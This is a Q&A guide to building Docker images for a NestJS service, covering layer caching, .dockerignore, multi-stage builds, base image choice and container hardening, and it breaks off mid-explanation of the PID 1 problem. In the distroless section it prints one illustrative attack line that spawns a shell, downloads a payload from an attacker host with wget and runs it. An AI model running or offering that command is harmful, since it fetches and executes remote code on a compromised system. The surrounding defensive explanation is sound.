## Section 1: Docker Image Fundamentals — Layers, the Union Filesystem, and the Build Cache

**Q1. How does Docker's layered filesystem work, and why does it matter for image design?**
A: A Docker image is a stack of read-only filesystem layers. Each instruction in a Dockerfile (`RUN`, `COPY`, `ADD`, `ENV`, `ARG`) that modifies the filesystem creates a new layer on top of the previous ones. At runtime, Docker adds a thin writable layer on top for the container's changes. The layers are composed using a Union Filesystem (OverlayFS on Linux).

**The layer model:**

```
Image: nestjs-api:prod

Layer 7  [RW]   Container writable layer (runtime; discarded on stop unless committed)
─────────────────────────────────────────────────────────────────
Layer 6  [RO]   COPY ./dist /app/dist          (2.1 MB) ← changes most frequently
Layer 5  [RO]   COPY package*.json ./           (8 KB)
Layer 4  [RO]   RUN npm ci --omit=dev           (87 MB) ← expensive; changes rarely
Layer 3  [RO]   WORKDIR /app                    (0 B)
Layer 2  [RO]   RUN apk add --no-cache dumb-init (1.2 MB)
Layer 1  [RO]   FROM node:20-alpine             (55 MB) ← base; almost never changes

Total image size: ~145 MB
Pulled from registry: only layers not already in the local cache
```

**OverlayFS mechanics:**

```
OverlayFS merges multiple directories (layers) into a single unified view.
Components:
  lowerdir:  the read-only image layers (stacked, bottom-to-top)
  upperdir:  the container's writable layer
  workdir:   internal OverlayFS bookkeeping directory
  merged:    the unified view the container's process sees

Read:  Docker looks for the file in upperdir first; if not found,
       searches lowerdir layers from top to bottom; returns the first match.
Write: Copy-on-Write (CoW) — when a container writes to a file that exists
       only in a lower (read-only) layer, OverlayFS copies the entire file
       to upperdir first, then writes the modification there.
       The original in lowerdir is unchanged.

CoW implication for image design:
  Writing large files inside a container is expensive (full file copy to upperdir).
  Databases, large log files, and caches should live on mounted volumes,
  not in the container's writable layer.
  Data written to the writable layer is lost when the container is removed
  (unless the layer is committed as a new image — never do this in production).
```

**Why layer count and layer size matter:**

```
Layer count:
  Each layer adds a small overhead (metadata, OverlayFS stack depth).
  Practical limit: Docker supports up to 125 layers; keep images under 20–30 layers.
  Consolidate related RUN commands with && to reduce layer count.

Layer size (more important than count):
  Large layers mean larger image pulls, longer CI build times, more registry storage.
  A layer with node_modules (often 200–500 MB) is pulled every time it changes.
  Keeping node_modules in a stable, rarely-changing layer maximizes cache hits.

The single most important layer design principle:
  Order layers from LEAST frequently changing (bottom) to MOST frequently
  changing (top). Cache invalidation propagates downward — when a layer
  changes, every layer above it is rebuilt, even if those upper layers
  have not changed.
```

**Q2. How does the Docker build cache work, and what invalidates it?**
A: Docker maintains a build cache keyed on the combination of: the parent layer's hash, the Dockerfile instruction, and the instruction's context (file contents for `COPY`/`ADD`, the command string for `RUN`). If all three match a previous build, Docker reuses the cached layer instead of re-executing the instruction.

**Cache key mechanics per instruction:**

```
FROM node:20-alpine
  Cache key: image name + tag + the digest of the pulled image.
  Invalidated: when the upstream image's digest changes (new patch release).
  Mitigation: pin to a digest for deterministic builds:
    FROM node:20.15.1-alpine3.20@sha256:abc123...

RUN npm ci --omit=dev
  Cache key: parent layer hash + the literal command string "npm ci --omit=dev".
  NOT based on what the command produces — only the command string.
  Invalidated: if the command string changes OR if the parent layer changed.
  Common mistake: the parent layer contains package.json;
  if package.json changed (COPY package*.json ./), this layer rebuilds.
  This is correct behavior — dependencies changed, so reinstall them.

COPY package*.json ./
  Cache key: parent layer hash + file contents hash of package.json and package-lock.json.
  Invalidated: when the content of either file changes.
  NOT invalidated by: file timestamps, file permissions (unless they differ),
                      unrelated file changes in the build context.

COPY . .
  Cache key: parent layer hash + content hash of every file in the build context.
  Invalidated: when ANY file in the build context changes.
  This is why COPY . . must come AFTER npm ci — a single source code change
  would otherwise bust the node_modules cache on every build.

ADD url https://...
  Cache key: the URL string only — NOT the content at the URL.
  Docker does not re-fetch the URL to check if content changed.
  Use curl inside a RUN instruction instead of ADD for URLs:
    RUN curl -fsSL https://... -o /tmp/file.tar.gz

ENV and ARG:
  ENV MY_VAR=value → invalidates cache for all subsequent layers.
  ARG MY_ARG        → invalidates cache only if the --build-arg value changes.
  Place ENV/ARG instructions after COPY/RUN layers they don't affect.
```

**Cache invalidation cascade:**

```
Dockerfile:
  Layer 1: FROM node:20-alpine           ← cache hit
  Layer 2: WORKDIR /app                  ← cache hit
  Layer 3: COPY package*.json ./         ← cache HIT (package.json unchanged)
  Layer 4: RUN npm ci --omit=dev         ← cache HIT (parent hit + same command)
  Layer 5: COPY . .                      ← cache MISS (src/app.ts changed)
  Layer 6: RUN npm run build             ← REBUILT (parent missed)
  Layer 7: CMD ["node", "dist/main.js"]  ← REBUILT (parent missed)

Only layers 5–7 are rebuilt. Layers 1–4 (including the 87 MB npm ci) are reused.
This is the entire point of ordering: protect expensive layers behind stable layers.

Cache miss sources in CI/CD:
  1. Runner has no local cache (fresh CI runner, cache purged).
     Fix: use registry cache (--cache-from / --cache-to with registry backend).
  2. Base image digest changed (weekly node:20-alpine patch releases).
     Fix: pin to digest, or accept and absorb the weekly invalidation.
  3. package-lock.json changed (dependency update PR).
     Expected: npm ci should always match package-lock.json.
  4. COPY . . includes generated files or IDE artifacts.
     Fix: .dockerignore (see Q3).
  5. Build arguments change (VERSION, GIT_SHA).
     Fix: place ARG VERSION at the end of the Dockerfile, after all expensive layers.
```

**Registry cache for CI/CD (BuildKit):**

```bash
# Push layers to registry as cache after build:
docker buildx build \
  --cache-from type=registry,ref=123456789012.dkr.ecr.ap-south-1.amazonaws.com/nestjs-api:cache \
  --cache-to   type=registry,ref=123456789012.dkr.ecr.ap-south-1.amazonaws.com/nestjs-api:cache,mode=max \
  --tag        123456789012.dkr.ecr.ap-south-1.amazonaws.com/nestjs-api:$GIT_SHA \
  .

# mode=max: caches all intermediate layers (not just the final image).
# mode=min: caches only the final stage layers (smaller cache; misses build-stage layers).
# For multi-stage builds: mode=max is required to cache the builder stage layers.

# GitHub Actions with ECR cache:
- name: Build and push
  uses: docker/build-push-action@v6
  with:
    cache-from: type=registry,ref=$ECR_REPO:cache
    cache-to:   type=registry,ref=$ECR_REPO:cache,mode=max
    tags:       $ECR_REPO:${{ github.sha }}
```

**Q3. What belongs in .dockerignore, and what happens if you get it wrong?**
A: `.dockerignore` controls which files are sent from the build context (your local filesystem or CI workspace) to the Docker daemon before the build begins. Every file in the build context is transferred — not just files referenced by `COPY` instructions. A missing or incomplete `.dockerignore` causes large build contexts, cache invalidation on irrelevant changes, and potential secret leakage.

**What happens without .dockerignore:**

```
Build context = entire project directory sent to Docker daemon.

Typical project directory (without .dockerignore):
  node_modules/          800 MB  ← sent to daemon even if not COPYed
  .git/                  150 MB  ← full git history
  dist/                   45 MB  ← previous build output
  coverage/               12 MB  ← test coverage reports
  .env                   <1 KB   ← SECRETS — sent to daemon, potentially cached
  docker-compose.yml     <1 KB   ← irrelevant to production build

Total build context: ~1 GB
Sent over the Docker socket on every docker build invocation.
Time to transfer: 10–30 seconds on a developer laptop; longer in CI.

More critically:
  COPY . . includes node_modules — Docker image now has TWO node_modules
  (the one COPYed from host + the one installed by npm ci).
  The host's node_modules (built for macOS/Windows) overwrites the container's
  (built for linux/amd64). Result: binary node addons crash at runtime.
  Symptom: "Error: /app/node_modules/bcrypt/lib/binding/napi-v3/bcrypt_lib.node:
            invalid ELF header" — native module built for wrong OS.
```

**Production .dockerignore for a NestJS project:**

```dockerignore
# Dependencies — always rebuilt inside the container
node_modules/
.pnp
.pnp.js

# Build outputs — rebuilt by the Docker build
dist/
build/

# Test artifacts
coverage/
*.lcov
.nyc_output/
__tests__/
**/*.test.ts
**/*.spec.ts
**/*.e2e-spec.ts

# Development config
.env
.env.*
!.env.example          # keep the example; exclude the real ones

# Version control
.git/
.gitignore
.gitattributes

# IDE and OS
.vscode/
.idea/
*.DS_Store
Thumbs.db

# Docker itself (avoid recursive Docker-in-Docker confusion)
Dockerfile*
docker-compose*.yml
.dockerignore

# CI/CD configs (not needed in the image)
.github/
.gitlab-ci.yml
Jenkinsfile

# Documentation
README.md
CHANGELOG.md
docs/

# Terraform / IaC (never in the app image)
terraform/
*.tf
*.tfvars

# Logs
*.log
logs/

Effect:
  Build context: ~1 GB → ~500 KB (source files only)
  Build context transfer: 10–30s → <1s
  COPY . . no longer includes node_modules, dist, or .env
  Cache: source file changes no longer inadvertently include IDE file timestamps
```

## Section 2: Layer Caching in Practice

**Q4. What is the canonical layer order for a Node.js/NestJS Dockerfile, and why?**
A: The canonical order maximizes cache reuse by placing the most stable layers at the bottom and the most frequently changing layers at the top. For Node.js applications, the most expensive layer is `npm ci` — it must be protected behind a stable `COPY package*.json ./` layer.

**The wrong order (cache-busting on every code change):**

```dockerfile
# ❌ Wrong — rebuilds node_modules on every source change
FROM node:20-alpine
WORKDIR /app
COPY . .                   # ← copies everything including src/
RUN npm ci --omit=dev      # ← ALWAYS runs; COPY . . always changes
RUN npm run build
CMD ["node", "dist/main.js"]

Build time: 60–90 seconds every build.
node_modules (87 MB) reinstalled even when only app.ts changed.
```

**The correct order (cache-aware):**

```dockerfile
# ✅ Correct — node_modules cached until package.json changes
FROM node:20-alpine
WORKDIR /app

# Layer 1: package manifests only — changes only when dependencies change
COPY package.json package-lock.json ./

# Layer 2: install dependencies — cached as long as package*.json unchanged
RUN npm ci --omit=dev

# Layer 3: source code — changes on every commit (expected; fast to copy)
COPY . .

# Layer 4: compile TypeScript — changes when src changes
RUN npm run build

CMD ["node", "dist/main.js"]

Cache behavior:
  Code change (src/user.service.ts modified):
    Layer 1: HIT  (package.json unchanged)
    Layer 2: HIT  (npm ci unchanged; parent hit)
    Layer 3: MISS (source changed)
    Layer 4: MISS (parent missed)
    Rebuilt: only COPY . . + npm run build (~5–10 seconds)
    Saved:   npm ci (60–90 seconds)

  Dependency change (added @nestjs/schedule to package.json):
    Layer 1: MISS (package.json changed)
    Layer 2: MISS (parent missed; npm ci reruns)
    Layer 3: MISS (parent missed)
    Layer 4: MISS (parent missed)
    Full rebuild expected — correct behavior.
```

**Handling monorepos and workspaces:**

```dockerfile
# pnpm workspace: only copy the manifests for the relevant package + root
FROM node:20-alpine
RUN npm install -g pnpm

WORKDIR /app

# Root workspace manifest
COPY pnpm-workspace.yaml pnpm-lock.yaml package.json ./

# Only the manifests for the service being built — not the full monorepo source
COPY apps/nestjs-api/package.json ./apps/nestjs-api/
COPY packages/shared/package.json  ./packages/shared/

# Install — cached until any of the above manifests change
RUN pnpm install --frozen-lockfile --filter nestjs-api...

# Now copy source for only the relevant packages
COPY apps/nestjs-api/ ./apps/nestjs-api/
COPY packages/shared/  ./packages/shared/

RUN pnpm --filter nestjs-api build

CMD ["node", "apps/nestjs-api/dist/main.js"]
```

**Q5. How do BuildKit cache mounts work, and when do they outperform layer caching?**
A: BuildKit (Docker's build engine since Docker 18.09) supports cache mounts: persistent directories that survive between builds and are shared across build stages, but are NOT included in the final image. They are ideal for package manager caches (`npm`, `pip`, `cargo`, `apt`) where the cache directory is large but only the installed output matters.

**The problem with standard layer caching for package managers:**

```
Standard layer cache for npm:
  RUN npm ci caches the entire node_modules layer (~87 MB).
  When package.json changes, the layer is invalidated and npm ci re-downloads
  every package from the registry — even if only one package was added.

  npm downloads packages to ~/.npm (its HTTP cache) first,
  then installs to node_modules.
  Without a cache mount, ~/.npm is discarded after every build run.
  Each build re-downloads all packages from the internet, regardless of
  whether they were downloaded in a previous build.
```

**BuildKit cache mount for npm:**

```dockerfile
# syntax=docker/dockerfile:1
FROM node:20-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./

# --mount=type=cache persists ~/.npm between builds on the same builder
# The cache is NOT included in the image layer
RUN --mount=type=cache,target=/root/.npm \
    npm ci --omit=dev

# What this achieves:
# First build:  downloads all packages; populates /root/.npm cache (~300 MB)
# Second build (package unchanged): layer cache HIT → npm ci not even called
# Second build (one package added): layer cache MISS → npm ci runs, but
#   all unchanged packages are served from /root/.npm (local disk, not internet)
#   Only the new package is downloaded. Build time: 5s vs 60s.
```

**Cache mount for other package managers:**

```dockerfile
# apt-get (Debian/Ubuntu base images)
RUN --mount=type=cache,target=/var/cache/apt,sharing=locked \
    --mount=type=cache,target=/var/lib/apt,sharing=locked \
    apt-get update && apt-get install -y --no-install-recommends \
      dumb-init \
      curl \
    && rm -rf /var/lib/apt/lists/*

# pip (Python)
RUN --mount=type=cache,target=/root/.cache/pip \
    pip install --no-cache-dir -r requirements.txt

# cargo (Rust) — registry cache + compiled dependency cache
RUN --mount=type=cache,target=/usr/local/cargo/registry \
    --mount=type=cache,target=/app/target \
    cargo build --release

# go modules
RUN --mount=type=cache,target=/go/pkg/mod \
    --mount=type=cache,target=/root/.cache/go-build \
    go build -o /app/server ./cmd/server
```

**Cache mount sharing modes:**

```
sharing=shared  (default): multiple concurrent builds share the same cache.
                            Reads are safe; writes may cause race conditions.
                            Fine for read-heavy caches (npm registry cache).

sharing=locked:             only one build can use the cache at a time.
                            Others wait. Use for caches that cannot handle
                            concurrent writes (apt database).

sharing=private:            each build gets its own copy of the cache.
                            No sharing at all; wastes disk; rarely needed.

In GitHub Actions with BuildKit:
  Cache mounts are tied to the BuildKit daemon instance.
  A fresh runner has no daemon → no cache mounts.
  Solution: combine cache mounts with --cache-from/--cache-to registry cache,
  OR use a persistent self-hosted runner with a long-lived BuildKit daemon.
  Cache mounts work best for local development builds and persistent CI runners.
```

## Section 3: Multi-Stage Builds

**Q6. What is a multi-stage build, and why is it essential for production images?**
A: A multi-stage build uses multiple `FROM` instructions in a single Dockerfile. Each `FROM` starts a new stage with its own filesystem. Artifacts (compiled binaries, built assets) can be selectively copied from one stage to another with `COPY --from=`. The final image contains only what is explicitly copied into the last stage — all build tools, source code, test frameworks, and intermediate files are discarded.

**The problem without multi-stage builds:**

```dockerfile
# ❌ Single-stage — ships everything, including build tools and source code
FROM node:20
WORKDIR /app
COPY package*.json ./
RUN npm ci                      # includes devDependencies (TypeScript, ESLint, Jest)
COPY . .
RUN npm run build
CMD ["node", "dist/main.js"]

Image contents:
  node:20 base:            350 MB  (full Node.js, npm, build tools)
  node_modules (all deps): 420 MB  (includes TypeScript compiler, Jest, ESLint)
  source code (src/):       12 MB  (TypeScript source — not needed at runtime)
  dist/:                     4 MB  (compiled JavaScript — what actually runs)
  Total:                   786 MB

Problems:
  Ships TypeScript compiler, ESLint, Jest, source maps in the production image.
  Attack surface: if an attacker achieves code execution, they have a full Node.js
  development environment and all source code.
  Pull time: 786 MB vs <150 MB for a properly staged image.
  Secrets leakage risk: .env files, build scripts, CI tokens accidentally COPYed.
```

**The canonical multi-stage NestJS Dockerfile:**

```dockerfile
# syntax=docker/dockerfile:1

# ─── Stage 1: Dependencies ────────────────────────────────────────────────────
FROM node:20-alpine AS deps
WORKDIR /app

COPY package.json package-lock.json ./

# Install ALL dependencies (including devDependencies for the build stage)
RUN --mount=type=cache,target=/root/.npm \
    npm ci

# ─── Stage 2: Builder ─────────────────────────────────────────────────────────
FROM node:20-alpine AS builder
WORKDIR /app

# Bring in all node_modules (including devDependencies — needed for tsc)
COPY --from=deps /app/node_modules ./node_modules
COPY . .

# Compile TypeScript → JavaScript
RUN npm run build

# ─── Stage 3: Production dependencies only ────────────────────────────────────
FROM node:20-alpine AS prod-deps
WORKDIR /app

COPY package.json package-lock.json ./

# Install only production dependencies — no TypeScript, Jest, ESLint
RUN --mount=type=cache,target=/root/.npm \
    npm ci --omit=dev

# ─── Stage 4: Runtime (final image) ───────────────────────────────────────────
FROM node:20-alpine AS runtime
WORKDIR /app

# Security: add a non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

# Install dumb-init for proper signal handling (PID 1)
RUN apk add --no-cache dumb-init

# Copy ONLY what is needed to run the application
COPY --from=prod-deps /app/node_modules ./node_modules
COPY --from=builder   /app/dist         ./dist

# Copy static assets if any (package.json for module resolution)
COPY package.json ./

# Drop to non-root
USER appuser

EXPOSE 3000

# dumb-init ensures SIGTERM is forwarded to Node.js (not swallowed by PID 1)
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/main.js"]
```

**Layer analysis of the final runtime image:**

```
FROM node:20-alpine:      55 MB  (slim Alpine + Node.js runtime only)
addgroup/adduser:          0 MB  (metadata only)
apk add dumb-init:         1 MB
node_modules (prod only): 87 MB  (no TypeScript, Jest, ESLint, ts-node)
dist/:                     4 MB  (compiled JavaScript — only what runs)
package.json:             <1 KB

Total runtime image:     ~147 MB vs 786 MB single-stage
Reduction:               81%

What is NOT in the runtime image:
  ❌ TypeScript compiler (tsc)
  ❌ Source maps (unless explicitly copied for error tracing — see below)
  ❌ Test framework (Jest, Supertest)
  ❌ Linters (ESLint, Prettier)
  ❌ TypeScript source files (.ts)
  ❌ Development node_modules
  ❌ .env files (never in the image; pull from SSM/Secrets Manager at runtime)
```

**Source maps in production — the tradeoff:**

```
Source maps let error stacks show TypeScript line numbers instead of
compiled JavaScript line numbers. This makes production debugging far easier.

Option A: No source maps in image (default above)
  Pros: smaller image; source code not exposed
  Cons: "at Object.<anonymous> (/app/dist/user.service.js:87:23)" — unhelpful

Option B: Copy source maps into the image
  COPY --from=builder /app/dist ./dist  # dist includes *.js.map files
  Pros: readable stack traces
  Cons: slightly larger image; .js.map files reference the original .ts source

Option C: Upload source maps to Sentry/Datadog at build time (recommended)
  RUN npx sentry-cli releases files "$SENTRY_RELEASE" \
      upload-sourcemaps ./dist --url-prefix '~/dist'
  Then delete them before the final COPY:
  The runtime image has no source maps; Sentry/Datadog resolves them server-side.
  Best of both worlds: readable traces, no source exposure in the image.
```

**Q7. What are the advanced patterns in multi-stage builds — named stages, conditional stages, and build arguments?**
A: Multi-stage builds support naming stages for selective targeting, using one stage as a base for multiple downstream stages, and parameterizing which stage to build with `--target`.

**Named stages and `--target` for different environments:**

```dockerfile
# syntax=docker/dockerfile:1
FROM node:20-alpine AS base
WORKDIR /app
COPY package.json package-lock.json ./
RUN --mount=type=cache,target=/root/.npm npm ci

# ── Development target ────────────────────────────────────────────────────────
FROM base AS development
# All deps already installed in base (including devDeps)
COPY . .
CMD ["npm", "run", "start:dev"]   # ts-node with hot reload

# ── Test target ───────────────────────────────────────────────────────────────
FROM base AS test
COPY . .
RUN npm run test                  # run tests during build; fail build if tests fail
RUN npm run test:e2e

# ── Builder target ────────────────────────────────────────────────────────────
FROM base AS builder
COPY . .
RUN npm run build

# ── Production runtime target ─────────────────────────────────────────────────
FROM node:20-alpine AS production
WORKDIR /app
RUN addgroup -S app && adduser -S app -G app
RUN apk add --no-cache dumb-init
COPY --from=base    /app/node_modules ./node_modules  # reuse; already prod-filtered below
COPY --from=builder /app/dist         ./dist
COPY package.json ./
USER app
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/main.js"]

# Build commands:
#   Local dev (docker-compose):  docker build --target development .
#   CI test gate:                docker build --target test .
#   Production image:            docker build --target production .
#   Default (no --target):       builds the last FROM stage = production ✅
```

**Sharing a base stage across parallel stages:**

```dockerfile
FROM node:20-alpine AS base
WORKDIR /app
COPY package.json package-lock.json ./
RUN --mount=type=cache,target=/root/.npm npm ci
COPY . .

# Both these stages start from base in parallel (BuildKit parallelizes them)
FROM base AS test-unit
RUN npm run test:unit

FROM base AS test-e2e
RUN npm run test:e2e

FROM base AS lint
RUN npm run lint

FROM base AS typecheck
RUN npm run typecheck

# Final stage — depends on all test/lint stages implicitly via build pipeline
# or explicitly with COPY --from= (even if nothing is copied, it forces the stage to run)
FROM node:20-alpine AS production
WORKDIR /app
# Force all validation stages to run before producing the production image:
COPY --from=test-unit  /dev/null /dev/null
COPY --from=test-e2e   /dev/null /dev/null
COPY --from=lint       /dev/null /dev/null
COPY --from=typecheck  /dev/null /dev/null
# Now copy the actual artifacts
COPY --from=base /app/dist ./dist
...

# BuildKit builds test-unit, test-e2e, lint, typecheck IN PARALLEL.
# If any fails, the production stage is not built.
# Total pipeline time ≈ max(individual stage time), not sum.
```

**ARG for parameterized builds:**

```dockerfile
# syntax=docker/dockerfile:1
ARG NODE_VERSION=20
ARG ALPINE_VERSION=3.20

FROM node:${NODE_VERSION}-alpine${ALPINE_VERSION} AS base

# Build-time metadata (does NOT change the layer cache for subsequent instructions
# because ARG is consumed here — below this line it reverts to undefined)
ARG GIT_SHA=unknown
ARG BUILD_DATE=unknown
ARG APP_VERSION=unknown

LABEL org.opencontainers.image.revision="${GIT_SHA}"
LABEL org.opencontainers.image.created="${BUILD_DATE}"
LABEL org.opencontainers.image.version="${APP_VERSION}"

# ⚠️  ARG placement critically affects layer caching:
#
# BAD — ARG before expensive layers invalidates cache when GIT_SHA changes:
#   ARG GIT_SHA
#   RUN npm ci     ← cache busted on every commit because GIT_SHA changed
#   COPY . .
#
# GOOD — ARG after expensive layers; only affects subsequent layers:
#   RUN npm ci     ← cached; ARG not yet defined here
#   COPY . .
#   ARG GIT_SHA    ← only LABEL and CMD layers are busted when SHA changes
#   LABEL org.opencontainers.image.revision="${GIT_SHA}"

# CI build command:
# docker buildx build \
#   --build-arg NODE_VERSION=20 \
#   --build-arg GIT_SHA=$(git rev-parse --short HEAD) \
#   --build-arg BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ) \
#   --build-arg APP_VERSION=$(cat package.json | jq -r .version) \
#   --tag nestjs-api:$(git rev-parse --short HEAD) \
#   .
```

## Section 4: Minimal Base Images

**Q8. What are the trade-offs between different Node.js base images, and how do you choose?**
A: Base image selection determines the attack surface, image size, available tooling, and compatibility with system-level dependencies. The choice is a three-way trade-off between size, capability, and security.

**The Node.js base image landscape:**

```
node:20 (Debian Bookworm — full)
  Size:     ~350 MB compressed; ~1 GB unpacked
  Contains: full Debian Linux, apt, bash, curl, git, Python, GCC, build tools
  Use when: your npm packages have native addons requiring a full build environment
            AND you don't want to use multi-stage builds
  Do NOT use for: production runtime images (attack surface; massive size)

node:20-slim (Debian Bookworm — minimal)
  Size:     ~75 MB compressed
  Contains: Debian Linux, minimal packages; no build tools; has apt, bash
  Use when: you need apt for runtime dependencies (e.g., libvips for Sharp image processing)
            and Alpine is incompatible with your dependencies
  Common for: apps using Sharp, Cairo, or other native addons that link glibc

node:20-alpine (Alpine Linux)
  Size:     ~55 MB compressed
  Contains: Alpine Linux (musl libc, busybox); apk package manager
  Use when: pure Node.js apps with no native addons, or native addons that build
            on Alpine (most popular ones do)
  Caveats:  musl libc instead of glibc — some native binaries (especially prebuilt
            binaries) don't work; Alpine-specific behavior in a few edge cases

node:20-alpine vs node:20-slim (the key decision):

  alpine:  smaller, BusyBox shell, musl libc, apk
  slim:    larger, bash, glibc, apt

  Choose alpine unless:
    - A dependency ships prebuilt glibc binaries (e.g., older versions of Sharp,
      Puppeteer, some Oracle/DB2 drivers)
    - A dependency's npm install script runs a configure/make step that assumes glibc
    - Your team uses Debian-based images everywhere for consistency

  Test for Alpine compatibility:
    docker build --target builder . and watch for:
      "Error: /app/node_modules/canvas/build/Release/canvas.node: invalid ELF header"
      → glibc binary on musl — switch to node:20-slim

node:20-distroless (Google Distroless)
  Size:     ~50 MB compressed
  Contains: Node.js runtime ONLY. No shell, no package manager, no curl, no ls.
  Use when: maximum security hardening; compliance requires no shell in runtime image
  Caveats:  no shell means no exec into the container for debugging;
            use a debug variant (node:20-distroless-debug) for troubleshooting
  Exec workaround: kubectl debug / docker debug to attach an ephemeral container

node:20-distroless in practice:
  FROM gcr.io/distroless/nodejs20-debian12 AS runtime
  COPY --from=builder /app/dist         ./dist
  COPY --from=prod-deps /app/node_modules ./node_modules
  COPY package.json ./
  # No USER instruction — distroless runs as nonroot by default
  # No ENTRYPOINT dumb-init — distroless uses its own PID 1 mechanism
  CMD ["dist/main.js"]   # distroless node runs node implicitly
```

|---|---|---|---|---|
| `node:20` | ~786 MB | ✅ bash | ✅ | Never (production) |
| `node:20-slim` | ~210 MB | ✅ bash | ✅ | glibc-dependent native addons |
| `node:20-alpine` | ~147 MB | ⚠️ sh | ❌ musl | Most NestJS apps |
| `node:20-distroless` | ~128 MB | ❌ | ✅ | Max security / compliance |
| `scratch` + static binary | ~20 MB | ❌ | ❌ | Go/Rust binaries; not Node.js |

**Q9. What is distroless and when should you use it for security-critical services?**
A: Distroless images (maintained by Google) contain only the language runtime and its direct dependencies — no operating system shell, no package manager, no `curl`, no `wget`, no cron, no `/bin/sh`. The attack surface for post-exploitation is dramatically reduced.

**The security argument for distroless:**

```
Standard attack path on a compromised container (node:20-alpine):
  1. Attacker achieves RCE via a vulnerable npm dependency.
  2. exec into the container: docker exec -it <container> sh
     or from RCE: spawn('/bin/sh', ['-c', 'wget attacker.com/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p'])
  3. Inside the container: curl, wget, apk available.
     Download additional tooling, pivot to the network, exfiltrate secrets.

Attack path on distroless:
  1. Attacker achieves RCE via the same vulnerability.
  2. No shell available: /bin/sh → not found; /bin/bash → not found.
  3. No curl, wget, apk, nc available.
  4. Attacker is limited to what Node.js itself can do.
  5. Cannot easily download further payloads or run OS-level commands.
  6. Blast radius is significantly contained.

Distroless is NOT a substitute for:
  Vulnerability scanning (Trivy, Grype) — scan all images including distroless
  Network policies (Kubernetes NetworkPolicy) — limit egress from the pod
  Runtime security (Falco) — detect anomalous syscalls even without a shell
  Non-root user — distroless defaults to nonroot; verify with: docker inspect

When distroless is worth the operational cost:
  Services that handle PII (customer data, KYC documents)
  Payment processing services
  Services with secrets in their runtime environment (API keys, DB passwords)
  Any service subject to PCI-DSS, SOC 2, or DPDP Act compliance
  Internal services that access production databases

When distroless is overkill:
  Dev/staging environments (debugging pain outweighs benefit)
  Read-only internal services with no sensitive data access
  Services already behind strict Kubernetes NetworkPolicy + Falco
```

**Debugging a distroless container in Kubernetes:**

```bash
# Kubernetes 1.23+: ephemeral debug container (non-destructive)
kubectl debug -it <pod-name> \
  --image=busybox \
  --target=<container-name>
# Attaches a BusyBox shell to the pod's network namespace
# Can inspect /proc/<pid>/fd to see open file descriptors
# Can run tcpdump, netstat, strace against the main process

# Docker (local development):
docker debug <container-id>
# Attaches a shell sidecar with debugging tools

# For production: use structured logging (Winston/Pino) + distributed tracing
# (OpenTelemetry → Jaeger/Tempo). Distroless forces you to build proper
# observability rather than relying on ad-hoc exec sessions.
```

**Q10. How do you handle system-level dependencies (shared libraries, OS packages) in minimal images?**
A: Minimal base images (Alpine, distroless) lack most system packages. Native Node.js addons, image processing libraries, PDF renderers, and database clients with native bindings all have transitive system-level dependencies. Multi-stage builds resolve this by installing build tools in the builder stage and copying only the runtime artifacts to the minimal final stage.

**Pattern 1: Alpine with explicit apk install in runtime stage (simple dependencies):**

```dockerfile
FROM node:20-alpine AS runtime
# dumb-init: PID 1 signal forwarding
# libstdc++: required by some native Node.js addons
# ca-certificates: TLS root certificates (usually pre-installed; verify for scratch images)
RUN apk add --no-cache \
    dumb-init \
    libstdc++ \
    ca-certificates \
    tzdata
# tzdata: required if your app sets process.env.TZ or uses timezone-aware date libraries

# Keep apk add in one layer; --no-cache avoids writing the apk index to the image
```

**Pattern 2: Copy shared libraries from builder (complex native addons):**

```dockerfile
FROM node:20-alpine AS builder
# Build tools needed only at compile time
RUN apk add --no-cache python3 make g++ vips-dev
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci     # compiles native addons (sharp, canvas, bcrypt)
COPY . .
RUN npm run build

FROM node:20-alpine AS runtime
# Only the runtime library — not the dev headers or build tools
RUN apk add --no-cache vips   # libvips runtime (no vips-dev)
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/dist         ./dist
# Sharp (and similar) loads libvips at runtime from the system path.
# The compiled .node file in node_modules links to libvips dynamically.
# Without vips in the runtime stage: "Error: libvips.so.42: cannot open shared object file"

# To find which shared libraries a .node addon needs:
# ldd /app/node_modules/sharp/build/Release/sharp.node
# → lists all .so files the compiled addon links against
# Ensure each is available in the runtime image.
```

**Pattern 3: Static linking in the builder (Rust-based Node.js tools):**

```dockerfile
# Some tools (SWC, Rollup native plugins) ship as static Rust binaries
# They have no runtime .so dependencies — copy the binary directly
FROM node:20-alpine AS builder
RUN apk add --no-cache musl-dev
WORKDIR /app
COPY . .
RUN npm ci && npm run build

FROM node:20-alpine AS runtime
WORKDIR /app
# @swc/core ships a statically linked binary — no libstdc++ needed
COPY --from=builder /app/dist         ./dist
COPY --from=builder /app/node_modules ./node_modules
CMD ["node", "dist/main.js"]
```

## Section 5: Security Hardening in Dockerfiles

**Q11. What are the essential security practices every production Dockerfile must implement?**
A: Security in Docker images is defense-in-depth across four areas: process identity (non-root), filesystem access (read-only, no unnecessary write), signal handling (correct PID 1), and image supply chain (pinned digests, scanned layers).

**1. Non-root user (mandatory):**

```dockerfile
# Alpine
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# Debian/Ubuntu
RUN groupadd -r appgroup && useradd -r -g appgroup -s /bin/false appuser
USER appuser

# Why:
# Docker containers run as root by default (UID 0).
# If an attacker achieves RCE, they run as root inside the container.
# With --privileged or volume mounts, root in the container can affect the host.
# Running as a non-root user limits the attacker to that user's permissions.

# Kubernetes reinforcement:
# securityContext:
#   runAsNonRoot: true
#   runAsUser: 1001          # match the UID created in the Dockerfile
#   allowPrivilegeEscalation: false
#   readOnlyRootFilesystem: true

# Common mistake: USER appuser before COPY — the copy lands as root
# Correct order: COPY as root, then USER appuser for CMD/ENTRYPOINT
# The files are owned by root:root but readable by appuser (755/644 defaults)
```

**2. dumb-init for correct signal handling (PID 1 problem):**

```dockerfile
RUN apk add --no-cache dumb-init
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/main.js"]

# The PID 1 problem:
# PID 1 is special in Linux — it is the init process and receives all orphaned
# child processes. Signals sent to PID 1 are NOT automatically forwarded to
# child processes UNLESS PID 1 explicitly handles them.
#
# node is NOT designed to run as PID 1:
#   docker stop sends SIGTERM to PID 1 (node).
